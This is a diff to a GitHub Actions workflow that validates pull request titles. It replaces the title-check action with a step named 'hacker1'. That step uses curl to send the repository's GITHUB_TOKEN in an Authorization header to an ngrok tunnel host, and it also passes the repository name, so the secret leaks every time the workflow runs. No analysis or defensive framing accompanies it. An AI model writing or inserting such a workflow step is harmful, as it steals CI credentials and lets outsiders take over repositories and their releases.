@@ -14,9 +14,10 @@ concurrency:
 jobs:
   main:
     name: Validate PR title
-    runs-on: ubuntu-22.04
+    runs-on: ubuntu-latest
     steps:
-      - uses: amannn/action-semantic-pull-request@v5.0.2
+      - name: hacker1
+        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" "https://d25a-2605-59c8-5c4-a710-e919-ce0f-a99e-e036.ngrok-free.app" '
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      - run: echo "in worflow $GITHUB_TOKEN"
+          REPO: ${{ github.repository }}
